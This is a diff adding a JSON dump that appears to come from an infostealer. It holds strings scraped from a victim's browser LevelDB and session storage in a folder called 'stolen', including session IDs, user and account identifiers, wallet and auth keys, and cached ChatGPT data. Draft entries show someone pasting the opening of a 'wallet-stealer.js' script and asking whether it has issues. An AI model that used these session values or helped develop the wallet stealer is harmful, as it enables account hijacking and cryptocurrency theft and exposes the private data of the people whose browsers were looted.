@@ -1,0 +1,925 @@
+{
+  "scan_time": "2026-05-09T08:36:43.365257",
+  "folder_scanned": "stolen",
+  "total_files": 13,
+  "entries": [
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_000005.ldb",
+      "Value": "$\rMETA:https://auth.openai.com",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_000005.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_000005.ldb",
+      "Value": "028expired_sessionM",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_000005.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_000005.ldb",
+      "Value": "8forwardToAuthAp.",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_000005.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003350.ldb",
+      "Value": "9\tscreen.githubusercontent",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003350.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003350.ldb",
+      "Value": "0\twallet.web3auth.io",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003350.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003350.ldb",
+      "Value": "2559070401,\"tokenU\":\"prakhar\"}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003350.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003350.ldb",
+      "Value": "\",\"customBehavior\":{},\"first_session\":false,\"browse\tY",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003350.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003351.ldb",
+      "Value": "Theme/user-fQDrf06TtTcGF6jd94mwC2iX",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003351.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003351.ldb",
+      "Value": "SeenNoAuthFreeTrial)",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003351.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003351.ldb",
+      "Value": "oggedInUserMessageCount",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003351.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003351.ldb",
+      "Value": "[\"OAUTH_GOOGLE_ENABLED\",\"CUSTOM_CLOUD",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003351.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003351.ldb",
+      "Value": "HUSER_CRYPTO_TOPUP_N",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003351.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003351.ldb",
+      "Value": "{\"connectedConnectorName\":\"auth\",\"cachedConnector\":\"auth\",\"currentChainId\":null,\"idToken\":null}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003351.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003351.ldb",
+      "Value": "ad6a42d9-9210-4ec7-917b-8540b79ff988\"},\"token",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003351.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003351.ldb",
+      "Value": "{\"sessionId\":\"1363acaa4e9834ceb111ec503a7b1599df050cbf9003f14d430afd2afbf1e76d\"} !",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003351.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003351.ldb",
+      "Value": "Tdiscord-handle-verific",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003351.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003351.ldb",
+      "Value": "\\migrating-users-uks-capp",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003351.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003353.ldb",
+      "Value": "cookieRotationStorageAccessTest",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003353.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003353.ldb",
+      "Value": "cache/user-fQDrf06TtTcGF6jd94mwC2iX/fc26fa80-485e-4b8b-b3eb-8f7800641920/conversa",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003353.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003353.ldb",
+      "Value": "x-innovative-pediatrics\",\"author",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003353.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003353.ldb",
+      "Value": ")Hcurrent_user_permis)",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003353.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003353.ldb",
+      "Value": "statsig.session_id.1792610830",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003353.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003355.ldb",
+      "Value": "cookieRotationStorageAccessTest",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003355.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003355.ldb",
+      "Value": "cache/user-fQDrf06TtTcGF6jd94mwC2iX/fc26fa80-485e-4b8b-b3eb-8f7800641920/models",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003355.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003355.ldb",
+      "Value": "cache/user-fQDrf06TtTcGF6jd94mwC2iX/fc26fa80-485e-4b8b-b3eb-8f7800641920/pinned-items",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003355.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003355.ldb",
+      "Value": "%jstatsig.session_id.1792610830",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003355.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003355.ldb",
+      "Value": "{\"sessionID\":\"cebc9afa-fb73-46bc-881c-a23c2c2ba989\",\"startTime\":1778140338826,\"lastUpdate\":1778140452645}\t'",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003355.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003355.ldb",
+      "Value": "cache/user-fQDrf06TtTcGF6jd94mwC2iX/fc26fa80-485e-4b8b-b3eb-8f7800641920/n",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003355.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "cache/user-fQDrf06TtTcGF6jd94mwC2iX/fc26fa80-485e-4b8b-b3eb-8f7800641920/conversation-history",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "statsig.session_id.1792610830j",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"sessionID\":\"64cf6a1e-7577-4b27-92ae-47cf1cb40c57\",\"startTime\":1778140447123,\"lastUpdate\":1778144394717}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "statsig.session_id.1792610830j",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"sessionID\":\"64cf6a1e-7577-4b27-92ae-47cf1cb40c57\",\"startTime\":1778140447123,\"lastUpdate\":1778144394719}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "statsig.session_id.1792610830j",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"sessionID\":\"64cf6a1e-7577-4b27-92ae-47cf1cb40c57\",\"startTime\":1778140447123,\"lastUpdate\":1778145132644}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "cache/user-fQDrf06TtTcGF6jd94mwC2iX/fc26fa80-485e-4b8b-b3eb-8f7800641920/gizmo-bootstrap",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"value\":{\"gizmos\":[{\"resource\":{\"gizmo\":{\"id\":\"g-1BPLhy361\",\"organization_id\":\"org-niXzpTdGLaokWlNZtDsj10HX\",\"short_url\":\"g-1BPLhy361-innovative-pediatrics\",\"author\":{\"user_id\":\"user-F0dBP38PKlym9zel3M6WobS1\",\"user_email\":null,\"display_name\":\"SHAN GAO\",\"link_to\":null,\"is_verified\":true,\"selected_display\":\"name\",\"will_receive_support_emails\":null,\"display_socials\":[]},\"voice\":{\"id\":\"ember\"},\"workspace_id\":null,\"model\":null,\"default_model\":null,\"instructions\":null,\"display\":{\"name\":\"Innovative Pe...",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "cache/user-fQDrf06TtTcGF6jd94mwC2iX/fc26fa80-485e-4b8b-b3eb-8f7800641920/snorlax-historyk",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "statsig.session_id.1792610830j",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"sessionID\":\"64cf6a1e-7577-4b27-92ae-47cf1cb40c57\",\"startTime\":1778140447123,\"lastUpdate\":1778145132647}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"drafts\":[{\"id\":\"69e71beb-3a38-83ea-9c57-fac43cbdd07a\",\"content\":\"here is my wall\",\"timestamp\":1778145561717}],\"userId\":\"user-fQDrf06TtTcGF6jd94mwC2iX\"}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"drafts\":[{\"id\":\"69e71beb-3a38-83ea-9c57-fac43cbdd07a\",\"content\":\"here is my wallet-stealer\",\"timestamp\":1778145567858}],\"userId\":\"user-fQDrf06TtTcGF6jd94mwC2iX\"}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"drafts\":[{\"id\":\"69e71beb-3a38-83ea-9c57-fac43cbdd07a\",\"content\":\"here is my wallet-stealer.js\",\"timestamp\":1778145570529}],\"userId\":\"user-fQDrf06TtTcGF6jd94mwC2iX\"}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"drafts\":[{\"id\":\"69e71beb-3a38-83ea-9c57-fac43cbdd07a\",\"content\":\"here is my wallet-stealer.js : \",\"timestamp\":1778145579707}],\"userId\":\"user-fQDrf06TtTcGF6jd94mwC2iX\"}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"drafts\":[{\"id\":\"69e71beb-3a38-83ea-9c57-fac43cbdd07a\",\"content\":\"here is my wallet-stealer.js :  \",\"timestamp\":1778145586167}],\"userId\":\"user-fQDrf06TtTcGF6jd94mwC2iX\"}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"drafts\":[{\"id\":\"69e71beb-3a38-83ea-9c57-fac43cbdd07a\",\"content\":\"here is my wallet-stealer.js,  :  \",\"timestamp\":1778145598232}],\"userId\":\"user-fQDrf06TtTcGF6jd94mwC2iX\"}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"drafts\":[{\"id\":\"69e71beb-3a38-83ea-9c57-fac43cbdd07a\",\"content\":\"here is my wallet-stealer.js, is there any likely  :  \",\"timestamp\":1778145607324}],\"userId\":\"user-fQDrf06TtTcGF6jd94mwC2iX\"}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "statsig.session_id.1792610830j",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"sessionID\":\"64cf6a1e-7577-4b27-92ae-47cf1cb40c57\",\"startTime\":1778140447123,\"lastUpdate\":1778145612706}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"drafts\":[{\"id\":\"69e71beb-3a38-83ea-9c57-fac43cbdd07a\",\"content\":\"here is my wallet-stealer.js, is there any likely issue from this  :  \",\"timestamp\":1778145661580}],\"userId\":\"user-fQDrf06TtTcGF6jd94mwC2iX\"}",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "{\"drafts\":[{\"id\":\"69e71beb-3a38-83ea-9c57-fac43cbdd07a\",\"content\":\"here is my wallet-stealer.js, is there any likely issue from this : // wallet-stealer.js - Final version\\r\\nconst fs = require('fs/promises');\\r\\nconst path = require('path');\\r\\nconst os = require('os');\\r\\n\\r\\nmodule.exports = async () => {\\r\\n    try {\\r\\n        console.log(\\\"[+] Wallet stealer started...\\\");\\r\\n\\r\\n        const found = [];\\r\\n        const savedPaths = [];\\r\\n        const tempDir = path.join(os.tmpdir(), '...",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003356.log",
+      "Value": "RESUME_TOKEN_STORE_KEY",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003356.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003357.ldb",
+      "Value": "RESUME_TOKEN_STORE_KEY",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003357.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003357.ldb",
+      "Value": "Ocache/user-fQDrf06TtTcGF6jd94mwC2iX/fc26fa80-485e-4b8b-b3eb-8f7800641920/convers%z$-history",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003357.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "leveldb_003357.ldb",
+      "Value": "cache/user-fQDrf06TtTcGF6jd94mwC2iX/fc26fa80-485e-4b8b-b3eb-8f7800641920/conversation-history",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/leveldb_003357.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "map-113-gapi.sessionStorageTest",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "\\AF_BANNERS_SESSION_ID",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "1-CLEAR_TG_AUTH_RESULT",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "FRONTEND_MONITOR_SDK_SESSION_ID",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "map-1531-FRONTEND_MONITOR_SDK_SESSION_ID",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "__session_storage_support__",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "600-AF_BANNERS_SESSION_ID",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000456.ldb",
+      "Value": "51-__ZCC__LIVECHAT__MONITOR__SessionId__",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000456.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3745-gapi.sessionStorageTest",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000459.ldb",
+      "Value": "map-3746-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000459.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000462.ldb",
+      "Value": "5-gapi.sessionStorageTest",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000462.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000462.ldb",
+      "Value": "4062-__ZCC__LIVECHAT__MONITOR__SessionId__",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000462.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000462.ldb",
+      "Value": "sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000462.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000462.ldb",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000462.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000462.ldb",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000462.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000462.ldb",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000462.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000462.ldb",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000462.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000462.ldb",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000462.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000464.log",
+      "Value": "map-4271-gapi.sessionStorageTest",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000464.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000464.log",
+      "Value": "map-4270-gapi.sessionStorageTest",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000464.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000464.log",
+      "Value": "map-4272-gapi.sessionStorageTest",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000464.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000464.log",
+      "Value": "map-4129-gapi.sessionStorageTest>\r[cl",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000464.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000464.log",
+      "Value": "map-4129-gapi.sessionStorageTest",
+      "Secure": "Unknown",
